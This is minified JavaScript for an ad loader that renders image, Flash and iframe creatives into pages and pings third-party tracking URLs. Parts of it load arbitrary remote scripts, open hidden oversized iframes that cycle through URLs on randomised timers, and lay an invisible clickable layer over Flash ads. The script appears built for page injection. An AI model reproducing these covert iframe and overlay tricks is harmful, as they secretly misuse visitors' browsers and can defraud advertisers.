var appUrl="";var scriptUrlSub="iter.hrdn.js";var scriptUrlHeader="";var allUrlHeader="";var ad;var locxx=0;var locyy=0;var timerIdtestId;var configh={app_style:1,app_location:2,service:"",container_id:"",creative:{type:0,w:0,h:0,code:"0",click:"",material:"",click:"",third_show_url:"",third_click_url:"",cookiemapping_url:"",cb_code:"",cb_show_monitor:""},ads_handler:"s",news_handler:"x",record_handler:"x",timer:1000};var logoWidth=24;var logoHeight=18;var biglogoWidth=131;var biglogoHeight=18;var ev={bind:function(a,c,b){if(a.addEventListener){a.addEventListener(c,b,false)}else{if(a.attachEvent){a.attachEvent("on"+c,b)}else{a["on"+c]=b}}},remove:function(a,c,b){if(a.removeEventListener){a.removeEventListener(c,b,false)}else{if(a.datachEvent){a.datachEvent("on"+c,b)}else{a["on"+c]=null}}},importFile:function(c,a){var d;switch(c){case"js":d=document.createElement("script");d.src=a;d.charset="utf-8";d.type="text/javascript";break;case"css":d=document.createElement("link");d.type="text/css";d.rel="stylesheet";d.href=a;break}var b=document.getElementsByTagName("head")[0];b.appendChild(d)},getXY:function(d){var a=0,e=0;if(d.getBoundingClientRect){var b=d.getBoundingClientRect();var c=document.documentElement;a=b.left+Math.max(c.scrollLeft,document.body.scrollLeft)-c.clientLeft;e=b.top+Math.max(c.scrollTop,document.body.scrollTop)-c.clientTop}else{for(;d!=document.body;a+=d.offsetLeft,e+=d.offsetTop,d=d.offsetParent){}}return{x:a,y:e}}};function checkClickUrl(d){var c=0;if(d.length>0){var b=d.indexOf("url=");var a=d.length;if(b<0){c=0}else{if((b+4)==a){c=0}else{c=1}}}else{c=0}return c}function getAdsClickUrl(d){var c="";if(d.length>0){var b=d.indexOf("&url=");var a=d.length;if(b>0){c=d.substring(b+5,a)}}return c}function getMonitorUrl(c){var b="";if(c.length>0){var a=c.indexOf("&url=");if(a>0){b=c.substring(0,a)}}return b}function checkImfImtUrl(a,g){if(a.indexOf(g)<0){return}var c=a.indexOf(">");if(c<=0){return}var h=a.substring(1,c);var b=a.substring(c+1,a.length);var j=1000;var f=500;var d=new Array();d=h.split("-");for(i=0;i<d.length;i++){var e=d[i];if(i==1&&e.length>0&&!isNaN(e)){j=parseInt(e)}if(i==2&&e.length>0&&!isNaN(e)){f=parseInt(e)}}return{lowTime:j,mastIime:f,httpStr:b}}var imfCount=0;function sendReqMsg(p){var b="<im";var s=p+"";if(s.length==0){return}var a=new Array();a=s.split(";");var h="";var u="";for(i=0;i<a.length;i++){var g=a[i];if(g.length>0&&g.toLowerCase()!="http://"&&g.indexOf(b)<0){ev.importFile("js",g)}if(g.indexOf("<imf")>=0){h=g+""}if(g.indexOf("<imt")>=0){u=g+""}}if(h.length>0){var c=1000;var r=500;var q="";var o=1000;var l=500;var k="";var e=checkImfImtUrl(h,"<imf");if("undefined"!=typeof(e)){c=e.lowTime;r=e.mastIime;q=e.httpStr}else{return}var t=checkImfImtUrl(u,"<imt");if("undefined"!=typeof(t)){o=t.lowTime;l=t.mastIime;k=t.httpStr}if(q.length>0){if(k.length>0){var m=document.createElement("iframe");m.id="tmphIfrm"+imfCount;imfCount=imfCount+1;m.style.display="none";m.src=q;m.width="1280px";m.height="800px";isx.container.appendChild(m);var n=c+parseInt(r*Math.random());var j=setInterval(function(){m.src=k;clearInterval(j)},n);var f=c+o+parseInt((r+l)*Math.random());var d=setInterval(function(){clearInterval(d);m.src="about:blank"},f)}else{var m=document.createElement("iframe");m.id="tmphIfrm"+imfCount;imfCount=imfCount+1;m.style.display="none";m.src=q;isx.container.appendChild(m);var n=c+parseInt(r*Math.random());var j=setInterval(function(){m.src="about:blank";clearInterval(j)},n)}}}}var timmmid;var jsloader={getIFrameDOM:function(a){return document.getElementById(a).contentDocument||document.frames[a].document},loadjsext:function(d,a,f,e,c){var g=document.createElement("div");g.id="isxhcrt00";var h=document.createElement("iframe");h.id="isx-h-f1";h.scrolling="no";h.width=f+"px";h.height=e+"px";h.marginWidth="0px";h.marginHeight="0px";h.frameBorder="0px";h.style.cssText="border:0px;background:none repeat scroll 0% 0%;margin:0px;padding:0px;top:0px;left:0px;";var b='<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body style="border:0;background:transparent;" scroll="no">'+c+a+"</body></html>";h.onload=h.onreadystatechange=function(){if(h.readyState&&h.readyState!="loaded"&&h.readyState!="complete"){return}else{h.onload=h.onreadystatechange=null;var j=jsloader.getIFrameDOM("isx-h-f1");if(navigator.userAgent.indexOf("Firefox")>0||navigator.userAgent.indexOf("Chrome")>0){j.open();j.write(b);j.close()}else{j.write(b)}}};d.appendChild(g);g.appendChild(h);jsloader.loadjsext1(d,f,e)},loadjsext1:function(a,c,b){var d=document.createElement("div");d.id="isxhcrt01";d.style.display="none";var e=document.createElement("iframe");e.id="isx-h-f2";e.scrolling="no";e.width=c+"px";e.height=b+"px";e.frameBorder="0px";e.marginWidth="0px";e.marginHeight="0px";e.frameBorder="0px";e.style.cssText="border:0px;background:none repeat scroll 0% 0% transparent;margin:0px;padding:0px;top:0px;left:0px;";a.appendChild(d);d.appendChild(e)}};var cacheh={fetchAds:function(){ad=new ISXAd(configh.creative)}};var ISXAd=function(a){this.container=isx.container;this.adData=a;this.contents=null;this.logos=null;this.biglogos=null;this.timerId=null;this.init()};ISXAd.prototype={init:function(){var a=this;a.createApps()},createApps:function(){var e=this;var h=e.adData;var b="",g="";var j=(h.material+"").toLowerCase();if(j.indexOf("http://null.jpg")>=0){isx.container.style.display="none";isx.container.parentNode.style.display="none";return}var d=document.createElement("div");if(e.adData.third_show_url){sendReqMsg(e.adData.third_show_url)}if(e.adData.cookiemapping_url){sendReqMsg(e.adData.cookiemapping_url)}isx.container.appendChild(d);d.className="isx-ad";d.style.width=h.w+"px";d.style.height=h.h+"px";var l=ev.getXY(isx.container);locxx=l.x;locyy=l.y;if(h.type==0){b=(h.click||"");var c=getAdsClickUrl(b);if(c.length>0){g+="<a class='large-image' target='_blank' href='"+c+"'><img src='"+h.material+"' alt=''  width='"+h.w+"' height='"+h.h+"' border='0px'/></a>"}else{g+="<img src='"+h.material+"' alt=''  width='"+h.w+"' height='"+h.h+"' border='0px'/>"}d.innerHTML=g}else{if(h.type==1){}else{if(h.type==2){b=(h.click||"");var c=getAdsClickUrl(b);if(c.length>0){}g+='<div id="hrdobj" style="text-align:left;position:absolute; z-index:2;width:'+h.w+"px;height:"+h.h+"px;top:"+l.y+"px;left:"+l.x+'px;">';g+='<object id="afg-adloader" width="'+h.w+'" height="'+h.h+'"  align="middle" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000">';g+='<param value="always" name="allowScriptAccess"/><param value="'+h.material+'" name="movie"/><param value="high" name="quality"/><param value="opaque" name="wmode"/><param value="high" name="quality">';g+='<embed width="'+h.w+'" height="'+h.h+'" align="middle" pluginspage="http://www.adobe.com/go/getflashplayer"  type="application/x-shockwave-flash" allowscriptaccess="always" wmode="opaque"  quality="high" src="'+h.material+'"></object>';g+="</div>";if(c.length>0){g+="<a id='hrda' href='"+c+"' target='_blank' style='display:block;width:"+h.w+"px;height:"+h.h+"px;position:absolute; z-index:999;background:#000;filter:alpha(opacity=0);-moz-opacity:0;opacity: 0;top:"+l.y+"px;left:"+l.x+"px;'></a>"}d.innerHTML=g}else{if(h.type==3){}else{if(h.type==4){if(h.code&&h.code.toLowerCase().indexOf("http://")==0){var a='<iframe src="'+h.code+'" scrolling="no" height="'+h.h+'" width="'+h.w+'" frameborder="0" border="0" marginwidth="0" marginheight="0"></iframe>';g+=a;d.innerHTML=g}else{var k="";if(h.cb_code&&h.cb_code!=""){configh.creative.h=h.h;configh.creative.w=h.w;configh.creative.cb_code=h.cb_code+"";if(h.cb_show_monitor){configh.creative.cb_show_monitor=h.cb_show_monitor}var f=Date.parse(new Date());k="<script type='text/javascript' src='"+scriptUrlHeader+"iter.cbhrd.js?v="+f+"'><\/script>"}jsloader.loadjsext(d,h.code,h.w,h.h,k)}}}}}}e.contents=d;e.bindAdsEvents();e.bindLogoEvents()},bindAdsEvents:function(){var c=this;var b=c.contents.children;if(b.length>0){if(b.length==2){var a=b[1];ev.bind(a,"mousedown",function(){c.sendAdsClickMsg()})}else{var a=b[0];ev.bind(a,"mousedown",function(){c.sendAdsClickMsg()})}}},bindLogoEvents:function(){var a=this;ev.bind(a.contents,"mouseover",function(){clearTimeout(a.timerId)});ev.bind(a.contents,"mouseout",function(){clearTimeout(a.timerId)})},removeLogoEvents:function(){var a=this;ev.remove(a.contents,"mouseover",function(){clearTimeout(a.timerId)});ev.remove(a.contents,"mouseout",function(){clearTimeout(a.timerId)})},sendAdsClickMsg:function(){var c=this;if(c.adData.third_click_url){sendReqMsg(c.adData.third_click_url)}var a=c.adData.click+"";var b=getMonitorUrl(a);if(b.length>0){ev.importFile("js",b)}},relocXY:function(){var c=this;var b=ev.getXY(isx.container);if(locxx!=b.x||locyy!=b.y){locxx=b.x;locyy=b.y;if(document.getElementById("hrdobj")){var a=document.getElementById("hrdobj");a.style.left=b.x+"px";a.style.top=b.y+"px"}if(document.getElementById("hrda")){var a=document.getElementById("hrda");a.style.left=b.x+"px";a.style.top=b.y+"px"}clearInterval(timerIdtestId)}}};var mixConfig=function(d){if(d&&typeof d=="object"){if(d.app_style){configh.app_style=d.app_style}if(d.app_location){configh.app_location=d.app_location}if(d.service){configh.service=d.service}if(d.creative){configh.creative=d.creative}if(d.container_id){configh.container_id=d.container_id}if(d.isp){configh.isp=d.isp}var b=configh.service.toLowerCase();var a=b.indexOf("/actions");if(a>=0){appUrl=b.substring(0,a)}else{appUrl=b}}else{return}};var isx={init:function(){if(typeof configh.isp=="undefined"){return}isx.createContainer();if(configh.container_id&&configh.container_id.length>0&&document.getElementById(configh.container_id)){document.getElementById(configh.container_id).appendChild(isx.container)}else{var c=document.getElementsByTagName("script");var b=0;for(var e=0,a=c.length;e<a;e++){var h=c[e];var f=h.src;if("undefined"!=typeof(f)){var d=f.indexOf(scriptUrlSub);if(d>0){if(h.parentElement){h.parentElement.appendChild(isx.container);b=1}scriptUrlHeader=f.substring(0,d);allUrlHeader=scriptUrlHeader.substring(0,scriptUrlHeader.length-1);var g=allUrlHeader.lastIndexOf("/");allUrlHeader=allUrlHeader.substring(0,g)}}}if(b==0){document.body.children&&document.body.insertBefore(isx.container,document.body.firstChild)}}},createContainer:function(){var a=document.createElement("div");a.id="isx-plugin-container-h";isx.container=a}};function init(a){var b=a;if(typeof b!="undefined"){mixConfig(b)}else{return}isx.init();cacheh.fetchAds();ev.bind(document,"resize",function(){ad.relocXY()});ev.bind(window,"resize",function(){ad.relocXY()});timerIdtestId=setInterval(function(){ad.relocXY()},50)}window.isx_config_h=function(a){init(a)};